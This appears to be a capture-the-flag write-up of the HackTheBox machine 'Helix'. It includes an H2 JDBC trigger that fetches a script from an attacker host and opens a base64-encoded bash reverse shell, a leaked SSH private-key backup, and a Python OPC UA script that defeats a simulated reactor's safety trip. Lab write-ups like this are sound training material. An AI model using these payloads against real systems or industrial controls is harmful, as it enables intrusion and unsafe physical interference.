# HackTheBox: Helix Write-up

## Enumeration

An initial Nmap scan against the target IP (10.129.245.123) reveals that ports 22 (SSH) and 80 (HTTP) are open.

```bash
nmap -sSVC -A 10.129.245.123
Starting Nmap 7.95 (https://nmap.org)
...
22/tcp open ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open http    nginx 1.18.0 (Ubuntu)
```

Fuzzing for subdomains using `ffuf` reveals a hidden subdomain named `flow`.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://helix.htb -H "Host: FUZZ.helix.htb" -ac
...
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1349ms]
```

## Initial Foothold

Navigating to `flow.helix.htb` reveals an Apache NiFi instance. We can achieve Remote Code Execution (RCE) by abusing the H2 database connection through a malicious trigger.

1.  **Start a netcat listener:**
    ```bash
    nc -lvnp 4444
    ```

2.  **Create a payload file named `rce.sql`:**
    ```sql
    CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS
    $$//javascript
    java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQONCAwPiYx}|{base64,-d}|{bash,-i}");
    $$--=x
    ```
    *(Note: Ensure the base64 payload matches your local IP and port).*

3.  **Host the payload via Python HTTP server:**
    ```bash
    python3 -m http.server 8000
    ```

4.  **Configure Apache NiFi:**
    *   Go to **Configure** -> **Controller Services** tab -> Click **+** -> Select **DBCPConnectionPool** -> **Add**.
    *   Configure the service with the following properties:
        *   **Database Driver Class Name:** `org.h2.Driver`
        *   **Database Driver Location:** `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`
        *   **Database Connection URL:** `jdbc:h2:file:/tmp/pwn;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM 'http://10.10.14.214:8000/rce.sql'`
    *   **Enable** the Controller Service.

5.  **Trigger the Payload:**
    *   Return to the **ExecuteSQL** processor.
    *   Under properties, select the newly created DBCPConnectionPool.
    *   Start the ExecuteSQL processor. 
    
This triggers the reverse shell as the `nifi` user.

```bash
nc -lvnp 4444
listening on [any] 4444
connect to [10.10.14.214] from (UNKNOWN) [10.129.245.123] 58530
```

## User Ownership

Searching the file system for support bundles reveals a backup of an SSH private key.

```bash
nifi@helix:/opt/nifi-1.21.0$ find / -name "*support-bundle*" 2>/dev/null
nifi@helix:/$ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMWAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----
```

We can copy this key to our local machine, set the correct permissions (`chmod 600`), and SSH into the machine as the `operator` user to claim the user flag.

```bash
ssh -i operator_key operator@flow.helix.htb
# User flag obtained.
```

## Privilege Escalation

In the `operator` user's home directory, there is an interesting document: `Operator Control & Safety Guide.pdf`. After downloading it via SCP, we find it is password-protected. The password is `operator1`. 

The guide details the OPC UA system controlling a reactor. We can write a Python exploit utilizing the `asyncua` library to interact with the OPC UA server running on `127.0.0.1:4840`, manipulate the temperature sensors, and force the system into a maintenance state.

**Exploit Script (`exploit.py`):**

```python
import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

async def main():
    async with Client(url=URL) as c:
        ns = await c.get_namespace_index("urn:helix:ot")
        N = lambda i: c.get_node(f"ns={ns};i={i}")
        
        # Nodes
        Mode, Testov, Calib = N(12), N(13), N(6)
        Rods, Cooling, Reset = N(8), N(9), N(14)
        Temp, Trip = N(4), N(10)
        
        print("[*] STEP 1: Emergency reactor cooling...")
        await Rods.write_value(ua.Variant(True, ua.VariantType.Boolean))
        await Cooling.write_value(ua.Variant(True, ua.VariantType.Boolean))
        await Calib.write_value(ua.Variant(0.0, ua.VariantType.Double)) # Reset offset
        
        print("[*] Waiting for temperature to drop below 285...")
        while True:
            t = await Temp.read_value()
            tr = await Trip.read_value()
            print(f" > Current T: {t:.2f} | Trip: {tr}", end="\r")
            if t < 285:
                break
            await asyncio.sleep(2)
            
        print("\n[+] Temperature is normal. Resetting Trip...")
        await Reset.write_value(ua.Variant(True, ua.VariantType.Boolean))
        await asyncio.sleep(1)
        
        print("[*] STEP 2: Preparing to open maintenance window...")
        await Mode.write_value(ua.Variant("MAINTENANCE", ua.VariantType.String))
        await Testov.write_value(ua.Variant(True, ua.VariantType.Boolean))
        
        print("[*] STEP 3: Final offset (+20)...")
        await Calib.write_value(ua.Variant(20.0, ua.VariantType.Double))
        await asyncio.sleep(2)
        
        t = await Temp.read_value()
        tr = await Trip.read_value()
        
        if t >= 295 and not tr:
            print(f"\n[!!!] SUCCESS! T={t:.2f}, Trip={tr}")
            print("[!!!] RUN IN TERMINAL: sudo /usr/local/sbin/helix-maint-console")
            while True: await asyncio.sleep(10)
        else:
            print(f"\n[-] Something went wrong: T={t:.2f}, Trip={tr}")

asyncio.run(main())
```

Execute the script in one SSH session. It will systematically bypass the safety limits:

```bash
operator@helix:~$ python3 /tmp/exploit.py
[*] STEP 1: Emergency reactor cooling...
[*] Waiting for temperature to drop below 285...
 > Current T: 283.82 | Trip: False
[+] Temperature is normal. Resetting Trip...
[*] STEP 2: Preparing to open maintenance window...
[*] STEP 3: Final offset (+20)...

[!!!] SUCCESS! T=303.91, Trip=False
[!!!] RUN IN TERMINAL: sudo /usr/local/sbin/helix-maint-console
```

Once the success message appears, quickly open a second SSH session and execute the maintenance console command to drop into a root shell.

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 109 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# 
# Root access obtained.
```
